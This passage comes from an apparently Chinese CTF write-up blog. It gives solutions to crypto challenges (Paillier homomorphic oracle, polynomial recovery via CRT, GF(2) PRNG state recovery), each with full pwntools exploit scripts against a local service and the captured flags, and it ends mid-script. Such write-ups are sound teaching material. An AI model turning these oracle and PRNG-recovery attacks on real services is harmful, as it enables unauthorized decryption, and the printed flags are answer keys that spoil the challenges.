check.&#x27;</span>)</span><br><span class="line">        <span class="keyword">return</span></span><br><span class="line"></span><br><span class="line">    p, c, d = chosen</span><br><span class="line">    log.success(<span class="string">f&#x27;p recovered: <span class="subst">&#123;p.bit_length()&#125;</span> bits&#x27;</span>)</span><br><span class="line"></span><br><span class="line">    <span class="keyword">for</span> val <span class="keyword">in</span> full:</span><br><span class="line">        io.recvuntil(<span class="string">b&#x27;guess:&#x27;</span>)</span><br><span class="line">        io.sendline(<span class="built_in">str</span>(val).encode())</span><br><span class="line"></span><br><span class="line">    tail = io.recvall(timeout=<span class="number">2</span>).decode(errors=<span class="string">&#x27;ignore&#x27;</span>)</span><br><span class="line">    <span class="built_in">print</span>(tail)</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&#x27;__main__&#x27;</span>:</span><br><span class="line">    main()</span><br></pre></td></tr></table></figure>

<p>ZJUCTF{Qu@terni0n_1$_jvs7_mA7rIx}</p>
<h3 id="paillier"><a href="#paillier" class="headerlink" title="paillier"></a>paillier</h3><ul>
<li>把字节串视为256进制整数，<code>&quot;CTRL-C + CTRL-V&quot;</code> 的结果可写成对明文 $m$ 的线性函数：$\text{concat}(x)&#x3D;C_1 m + C_2$（其中 $C_1&#x3D;256^{L+2}+256,\ C_2&#x3D;\text{dash}\cdot(256^{2L+2}+256^{L+1}+1)$）</li>
<li>利用 Paillier 的加法同态和本地伪加密 $\mathrm{enc}(t)&#x3D;(1+tn)\bmod n^2$，构造 $y&#x3D;c^{C_1}\cdot \mathrm{enc}(C_2)$，用相等性oracle判定给定 $L$ 是否正确，从而确定flag的长度</li>
<li>已知长度后，逐字节猜测前缀；每次将猜到的前缀移位并同态抵消得到 $c_{\text{diff}}&#x3D;\mathrm{Enc}(m-\tilde m)$，再用长度判定检查剩余长度是否等于预期 <code>shift</code></li>
<li>如此循环即可恢复flag</li>
</ul>
<p>exp.py</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">import</span> re</span><br><span class="line"><span class="keyword">from</span> tqdm <span class="keyword">import</span> trange</span><br><span class="line"></span><br><span class="line">io = remote(<span class="string">&quot;127.0.0.1&quot;</span>, <span class="number">61234</span>)</span><br><span class="line"></span><br><span class="line">n_line = io.recvline().decode()</span><br><span class="line">ct_line = io.recvline().decode()</span><br><span class="line"></span><br><span class="line">n = <span class="built_in">int</span>(re.search(<span class="string">r&quot;n = (\d+)&quot;</span>, n_line).group(<span class="number">1</span>))</span><br><span class="line">c_flag = <span class="built_in">int</span>(re.search(<span class="string">r&quot;treasure for you:  (\d+)&quot;</span>, ct_line).group(<span class="number">1</span>))</span><br><span class="line">n2 = n * n</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">enc</span>(<span class="params">m</span>):</span><br><span class="line">    <span class="keyword">return</span> (<span class="number">1</span> + m * n) % n2</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">check_len</span>(<span class="params">c, length</span>):</span><br><span class="line">    <span class="keyword">if</span> length &lt; <span class="number">0</span>:</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">False</span></span><br><span class="line">    dash = <span class="number">45</span></span><br><span class="line"></span><br><span class="line">    C1 = (<span class="built_in">pow</span>(<span class="number">256</span>, length + <span class="number">2</span>, n) + <span class="number">256</span>) % n</span><br><span class="line"></span><br><span class="line">    C2_part1 = <span class="built_in">pow</span>(<span class="number">256</span>, <span class="number">2</span> * length + <span class="number">2</span>, n)</span><br><span class="line">    C2_part2 = <span class="built_in">pow</span>(<span class="number">256</span>, length + <span class="number">1</span>, n)</span><br><span class="line">    C2 = (dash * (C2_part1 + C2_part2 + <span class="number">1</span>)) % n</span><br><span class="line"></span><br><span class="line">    c_c1 = <span class="built_in">pow</span>(c, C1, n2)</span><br><span class="line">    c_c2 = enc(C2)</span><br><span class="line">    y = (c_c1 * c_c2) % n2</span><br><span class="line"></span><br><span class="line">    io.sendlineafter(</span><br><span class="line">        <span class="string">b&quot;Show me how skilled you are at additive homomorphism: &quot;</span>, <span class="string">b&quot;CTRL-C + CTRL-V&quot;</span></span><br><span class="line">    )</span><br><span class="line">    io.sendlineafter(<span class="string">b&quot;Parameters: &quot;</span>, <span class="string">f&quot;<span class="subst">&#123;c&#125;</span>,<span class="subst">&#123;y&#125;</span>&quot;</span>.encode())</span><br><span class="line"></span><br><span class="line">    response = io.recvline()</span><br><span class="line">    <span class="keyword">if</span> <span class="string">b&quot;Good job&quot;</span> <span class="keyword">in</span> response:</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">True</span></span><br><span class="line">    <span class="keyword">return</span> <span class="literal">False</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">flag_len = <span class="number">0</span></span><br><span class="line"><span class="keyword">for</span> l <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">38</span>, <span class="number">60</span>):</span><br><span class="line">    log.info(<span class="string">f&quot;Checking length: <span class="subst">&#123;l&#125;</span>&quot;</span>)</span><br><span class="line">    <span class="keyword">if</span> check_len(c_flag, l):</span><br><span class="line">        flag_len = l</span><br><span class="line">        log.success(<span class="string">f&quot;Flag length found: <span class="subst">&#123;flag_len&#125;</span>&quot;</span>)</span><br><span class="line">        <span class="keyword">break</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">known_prefix = <span class="string">b&quot;&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> trange(<span class="built_in">len</span>(known_prefix), flag_len+<span class="number">1</span>):</span><br><span class="line">    shift = flag_len - (i + <span class="number">1</span>)</span><br><span class="line">    alphabets = <span class="built_in">list</span>(<span class="built_in">range</span>(<span class="number">31</span>, <span class="number">127</span>))</span><br><span class="line"></span><br><span class="line">    <span class="keyword">for</span> g <span class="keyword">in</span> alphabets:</span><br><span class="line">        curr_g_b = known_prefix + <span class="built_in">bytes</span>([g])</span><br><span class="line">        m_g = <span class="built_in">int</span>.from_bytes(curr_g_b, <span class="string">&quot;big&quot;</span>)</span><br><span class="line">        m_g_shf = m_g * <span class="built_in">pow</span>(<span class="number">256</span>, shift)</span><br><span class="line">        c_m_g_shf = enc(m_g_shf)</span><br><span class="line">        inv_c_m_g_shf = <span class="built_in">pow</span>(c_m_g_shf, -<span class="number">1</span>, n2)</span><br><span class="line">        c_diff = (c_flag * inv_c_m_g_shf) % n2</span><br><span class="line">        correct = <span class="literal">False</span></span><br><span class="line">        <span class="keyword">if</span> check_len(c_diff, shift):</span><br><span class="line">            correct = <span class="literal">True</span></span><br><span class="line">        <span class="keyword">if</span> correct:</span><br><span class="line">            known_prefix += <span class="built_in">bytes</span>([g])</span><br><span class="line">            <span class="built_in">print</span>(<span class="string">f&quot;Found so far: <span class="subst">&#123;known_prefix.decode()&#125;</span>&quot;</span>)</span><br><span class="line">            <span class="keyword">break</span></span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        known_prefix += <span class="string">b&quot;#&quot;</span></span><br><span class="line">        <span class="keyword">break</span></span><br><span class="line"></span><br><span class="line">log.success(<span class="string">f&quot;[+] FLAG: <span class="subst">&#123;known_prefix.decode()&#125;</span>&quot;</span>)</span><br><span class="line">io.close()</span><br></pre></td></tr></table></figure>

<p>ZJUCTF{W0w_yOu_re411y_KN0w_aLoT_Ab0uT_Pa1lLi3r}</p>
<h3 id="easy-poly"><a href="#easy-poly" class="headerlink" title="easy_poly"></a>easy_poly</h3><ul>
<li>把多项式系数当成以基数 $B&#x3D;p$ 的数字，目标是还原 $F&#x3D;f(p)&#x3D;\sum a_i p^i$</li>
<li>题目允许对任意素数 $m&lt;750$ 求值，且有 $f\pmod m (p\bmod m)&#x3D;F \bmod m$，所以每次查询都给到 $F \bmod m$</li>
<li>选若干互素模数做查询，用CRT合并所有余数，得到整数 $F$（只要模积 $M&gt;p^{32}$ 即唯一）</li>
<li>将 $F$ 以基数 $p$ 展开 32 位：连续取 $F \bmod p$、整除 $p$，得到全部系数 $a_0,\dots,a_{31}$，提交即可</li>
</ul>
<p>exp.py</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">import</span> math, re, time</span><br><span class="line"></span><br><span class="line">HOST, PORT = <span class="string">&quot;127.0.0.1&quot;</span>, <span class="number">61234</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">primes_below</span>(<span class="params">n=<span class="number">750</span></span>):</span><br><span class="line">    n = <span class="built_in">int</span>(n)</span><br><span class="line">    sieve = [<span class="literal">True</span>]*(n+<span class="number">1</span>)</span><br><span class="line">    sieve[<span class="number">0</span>]=sieve[<span class="number">1</span>]=<span class="literal">False</span></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">2</span>, <span class="built_in">int</span>(n**<span class="number">0.5</span>)+<span class="number">1</span>):</span><br><span class="line">        <span class="keyword">if</span> sieve[i]:</span><br><span class="line">            step = i</span><br><span class="line">            start = i*i</span><br><span class="line">            sieve[start:n+<span class="number">1</span>:step] = [<span class="literal">False</span>]*(((n-start)//step)+<span class="number">1</span>)</span><br><span class="line">    <span class="keyword">return</span> [i <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">2</span>, n+<span class="number">1</span>) <span class="keyword">if</span> sieve[i]]</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">crt_pairs</span>(<span class="params">pairs</span>):</span><br><span class="line">    x, mod = <span class="number">0</span>, <span class="number">1</span></span><br><span class="line">    <span class="keyword">for</span> (r, m) <span class="keyword">in</span> pairs:</span><br><span class="line">        inv = <span class="built_in">pow</span>(mod, -<span class="number">1</span>, m)</span><br><span class="line">        t = ((r - x) % m) * inv % m</span><br><span class="line">        x = x + mod * t</span><br><span class="line">        mod *= m</span><br><span class="line">    <span class="keyword">return</span> x, mod</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">main</span>():</span><br><span class="line">    context.log_level = <span class="string">&quot;warning&quot;</span></span><br><span class="line">    context.timeout = <span class="number">1</span></span><br><span class="line"></span><br><span class="line">    io = remote(HOST, PORT)</span><br><span class="line"></span><br><span class="line">    line = io.recvline(timeout=<span class="number">20</span>)</span><br><span class="line">    <span class="keyword">if</span> <span class="keyword">not</span> line:</span><br><span class="line">        <span class="keyword">raise</span> RuntimeError(<span class="string">&quot;未读到 p 行&quot;</span>)</span><br><span class="line">    s = line.decode(errors=<span class="string">&quot;ignore&quot;</span>).strip()</span><br><span class="line">    <span class="keyword">assert</span> s.startswith(<span class="string">&quot;p =&quot;</span>)</span><br><span class="line">    p = <span class="built_in">int</span>(s.split(<span class="string">&quot;=&quot;</span>)[<span class="number">1</span>].strip())</span><br><span class="line"></span><br><span class="line">    target_bits = math.ceil(<span class="number">32</span> * math.log2(p)) + <span class="number">12</span></span><br><span class="line">    primes = primes_below(<span class="number">749</span>)</span><br><span class="line">    primes.sort(reverse=<span class="literal">True</span>)</span><br><span class="line"></span><br><span class="line">    chosen = []</span><br><span class="line">    M = <span class="number">1</span></span><br><span class="line">    <span class="keyword">for</span> m <span class="keyword">in</span> primes:</span><br><span class="line">        chosen.append(m)</span><br><span class="line">        M *= m</span><br><span class="line">        <span class="keyword">if</span> M.bit_length() &gt;= target_bits:</span><br><span class="line">            <span class="keyword">break</span></span><br><span class="line"></span><br><span class="line">    out = []</span><br><span class="line">    <span class="keyword">for</span> m <span class="keyword">in</span> chosen:</span><br><span class="line">        out.append(<span class="string">&quot;1\n&quot;</span>)</span><br><span class="line">        out.append(<span class="string">f&quot;<span class="subst">&#123;m&#125;</span>\n&quot;</span>)</span><br><span class="line">        out.append(<span class="string">f&quot;<span class="subst">&#123;p % m&#125;</span>\n&quot;</span>)</span><br><span class="line">    io.send(<span class="string">&quot;&quot;</span>.join(out).encode())</span><br><span class="line"></span><br><span class="line">    results = []</span><br><span class="line">    pat = re.<span class="built_in">compile</span>(<span class="string">rb&quot;result\s*=\s*(-?\d+)&quot;</span>)</span><br><span class="line">    buf = <span class="string">b&quot;&quot;</span></span><br><span class="line">    pos = <span class="number">0</span></span><br><span class="line">    deadline = time.time() + <span class="number">9.0</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">while</span> <span class="built_in">len</span>(results) &lt; <span class="built_in">len</span>(chosen) <span class="keyword">and</span> time.time() &lt; deadline:</span><br><span class="line">        chunk = io.recv(timeout=<span class="number">0.4</span>)</span><br><span class="line">        <span class="keyword">if</span> <span class="keyword">not</span> chunk:</span><br><span class="line">            chunk = io.recv(timeout=<span class="number">0.4</span>)</span><br><span class="line">            <span class="keyword">if</span> <span class="keyword">not</span> chunk:</span><br><span class="line">                <span class="keyword">break</span></span><br><span class="line">        buf += chunk</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> <span class="string">b&quot;Error!&quot;</span> <span class="keyword">in</span> buf:</span><br><span class="line">            <span class="keyword">raise</span> RuntimeError(<span class="string">&quot;服务端报错/超时退出（可能 alarm(10) 触发）。&quot;</span>)</span><br><span class="line"></span><br><span class="line">        found_any = <span class="literal">False</span></span><br><span class="line">        <span class="keyword">for</span> m_ <span class="keyword">in</span> pat.finditer(buf, pos):</span><br><span class="line">            val = <span class="built_in">int</span>(m_.group(<span class="number">1</span>))</span><br><span class="line">            results.append(val)</span><br><span class="line">            pos = m_.end()</span><br><span class="line">            found_any = <span class="literal">True</span></span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> found_any <span class="keyword">and</span> pos &gt; <span class="number">4096</span>:</span><br><span class="line">            buf = buf[pos-<span class="number">64</span>:]</span><br><span class="line">            pos = <span class="number">64</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> <span class="built_in">len</span>(results) &lt; <span class="built_in">len</span>(chosen):</span><br><span class="line">        <span class="keyword">raise</span> RuntimeError(<span class="string">f&quot;只收到 <span class="subst">&#123;<span class="built_in">len</span>(results)&#125;</span>/<span class="subst">&#123;<span class="built_in">len</span>(chosen)&#125;</span> 个 result，可能时间耗尽。&quot;</span>)</span><br><span class="line"></span><br><span class="line">    pairs = <span class="built_in">list</span>(<span class="built_in">zip</span>(results[:<span class="built_in">len</span>(chosen)], chosen[:<span class="built_in">len</span>(results)]))</span><br><span class="line"></span><br><span class="line">    F, Mod = crt_pairs(pairs)</span><br><span class="line">    <span class="keyword">if</span> <span class="keyword">not</span> (<span class="number">0</span> &lt;= F &lt; Mod):</span><br><span class="line">        <span class="keyword">raise</span> RuntimeError(<span class="string">&quot;CRT 结果异常，请重试或增加冗余模数。&quot;</span>)</span><br><span class="line"></span><br><span class="line">    coeffs = []</span><br><span class="line">    T = F</span><br><span class="line">    <span class="keyword">for</span> _ <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">32</span>):</span><br><span class="line">        coeffs.append(T % p)</span><br><span class="line">        T //= p</span><br><span class="line"></span><br><span class="line">    io.send(<span class="string">b&quot;2\n&quot;</span>)</span><br><span class="line">    io.send((<span class="string">&quot; &quot;</span>.join(<span class="built_in">str</span>(c) <span class="keyword">for</span> c <span class="keyword">in</span> coeffs) + <span class="string">&quot;\n&quot;</span>).encode())</span><br><span class="line"></span><br><span class="line">    <span class="keyword">try</span>:</span><br><span class="line">        <span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line">            data = io.recvline(timeout=<span class="number">0.5</span>)</span><br><span class="line">            <span class="keyword">if</span> <span class="keyword">not</span> data:</span><br><span class="line">                <span class="keyword">break</span></span><br><span class="line">            <span class="built_in">print</span>(data.decode(errors=<span class="string">&quot;ignore&quot;</span>).rstrip())</span><br><span class="line">    <span class="keyword">except</span> EOFError:</span><br><span class="line">        <span class="keyword">pass</span></span><br><span class="line"></span><br><span class="line">    io.close()</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&quot;__main__&quot;</span>:</span><br><span class="line">    main()</span><br></pre></td></tr></table></figure>

<p>ZJUCTF{16d75376-87e4-4e55-b4b2-b370c6ddef46}</p>
<h3 id="prng-study-plus-2"><a href="#prng-study-plus-2" class="headerlink" title="prng study plus 2"></a>prng study plus 2</h3><ul>
<li>选Level 2：把题里的PRNG看成512比特上的GF(2)线性仿射变换 <code>F(a)=A·a ⊕ c</code>，输出取低64位。</li>
<li>用前8组泄露的64位（共512比特）搭出512×512线性方程组，解出初始状态 <code>a0</code>（必要时用hint的sha256在零空间里唯一化）。</li>
<li>之后按 <code>a←A·a⊕c</code> 迭代，预测出接下来的20个输出，逐个回填</li>
</ul>
<p>exp.py</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br><span class="line">166</span><br><span class="line">167</span><br><span class="line">168</span><br><span class="line">169</span><br><span class="line">170</span><br><span class="line">171</span><br><span class="line">172</span><br><span class="line">173</span><br><span class="line">174</span><br><span class="line">175</span><br><span class="line">176</span><br><span class="line">177</span><br><span class="line">178</span><br><span class="line">179</span><br><span class="line">180</span><br><span class="line">181</span><br><span class="line">182</span><br><span class="line">183</span><br><span class="line">184</span><br><span class="line">185</span><br><span class="line">186</span><br><span class="line">187</span><br><span class="line">188</span><br><span class="line">189</span><br><span class="line">190</span><br><span class="line">191</span><br><span class="line">192</span><br><span class="line">193</span><br><span class="line">194</span><br><span class="line">195</span><br><span class="line">196</span><br><span class="line">197</span><br><span class="line">198</span><br><span class="line">199</span><br><span class="line">200</span><br><span class="line">201</span><br><span class="line">202</span><br><span class="line">203</span><br><span class="line">204</span><br><span class="line">205</span><br><span class="line">206</span><br><span class="line">207</span><br><span class="line">208</span><br><span class="line">209</span><br><span class="line">210</span><br><span class="line">211</span><br><span class="line">212</span><br><span class="line">213</span><br><span class="line">214</span><br><span class="line">215</span><br><span class="line">216</span><br><span class="line">217</span><br><span class="line">218</span><br><span class="line">219</span><br><span class="line">220</span><br><span class="line">221</span><br><span class="line">222</span><br><span class="line">223</span><br><span class="line">224</span><br><span class="line">225</span><br><span class="line">226</span><br><span class="line">227</span><br><span class="line">228</span><br><span class="line">229</span><br><span class="line">230</span><br><span class="line">231</span><br><span class="line">232</span><br><span class="line">233</span><br><span class="line">234</span><br><span class="line">235</span><br><span class="line">236</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> remote, context</span><br><span class="line"><span class="keyword">import</span> re, sys, string, hashlib, multiprocessing <span class="keyword">as</span> mp</span><br><span class="line"></span><br><span class="line">context.log_level = <span class="string">&quot;debug&quot;</span></span><br><span class="line"></span><br><span class="line">HOST = sys.argv[<span class="number">1</span>] <span class="keyword">if</span> <span class="built_in">len</span>(sys.argv) &gt;= <span class="number">2</span> <span class="keyword">else</span> <span class="string">&quot;127.0.0.1&quot;</span></span><br><span class="line">PORT = <span class="built_in">int</span>(sys.argv[<span class="number">2</span>]) <span class="keyword">if</span> <span class="built_in">len</span>(sys.argv) &gt;= <span class="number">3</span> <span class="keyword">else</span> <span class="number">61234</span></span><br><span class="line"></span><br><span class="line">N = <span class="built_in">int</span>(</span><br><span class="line">    <span class="string">&quot;0x2367E9EC53A2EE858890B554970749BC5BB8446D4B849ADED2D08A550E0777CCEA180DCBD037D26536160C86D42EDBDE576F156C8B9D8EFEAE946B545B9CCEFB&quot;</span>,</span><br><span class="line">    <span class="number">16</span>,</span><br><span class="line">)</span><br><span class="line">MASK512 = (<span class="number">1</span> &lt;&lt; <span class="number">512</span>) - <span class="number">1</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">F_code</span>(<span class="params">a: <span class="built_in">int</span></span>) -&gt; <span class="built_in">int</span>:</span><br><span class="line">    temp = MASK512</span><br><span class="line">    x = a</span><br><span class="line">    <span class="keyword">for</span> _ <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">512</span>):</span><br><span class="line">        temp ^= (x &amp; <span class="number">1</span>)</span><br><span class="line">        fb = temp &amp; <span class="number">1</span></span><br><span class="line">        temp = (temp &gt;&gt; <span class="number">1</span>) ^ (N &amp; -(fb &amp; <span class="number">1</span>))</span><br><span class="line">        x &gt;&gt;= <span class="number">1</span></span><br><span class="line">    <span class="keyword">return</span> temp ^ MASK512</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">build_affine</span>():</span><br><span class="line">    c = F_code(<span class="number">0</span>)</span><br><span class="line">    cols = [<span class="number">0</span>] * <span class="number">512</span></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">512</span>):</span><br><span class="line">        cols[i] = F_code(<span class="number">1</span> &lt;&lt; i) ^ c</span><br><span class="line">    <span class="keyword">return</span> cols, c</span><br><span class="line"></span><br><span class="line">Acols, Cvec = build_affine()</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">A_times_vec</span>(<span class="params">vec: <span class="built_in">int</span></span>) -&gt; <span class="built_in">int</span>:</span><br><span class="line">    res = <span class="number">0</span></span><br><span class="line">    v = vec</span><br><span class="line">    <span class="keyword">while</span> v:</span><br><span class="line">        low = v &amp; -v</span><br><span class="line">        idx = (low.bit_length() - <span class="number">1</span>)</span><br><span class="line">        res ^= Acols[idx]</span><br><span class="line">        v ^= low</span><br><span class="line">    <span class="keyword">return</span> res</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">parity</span>(<span class="params">x: <span class="built_in">int</span></span>) -&gt; <span class="built_in">int</span>:</span><br><span class="line">    <span class="keyword">return</span> x.bit_count() &amp; <span class="number">1</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">rows_times_A</span>(<span class="params">rows</span>):</span><br><span class="line">    new_rows = []</span><br><span 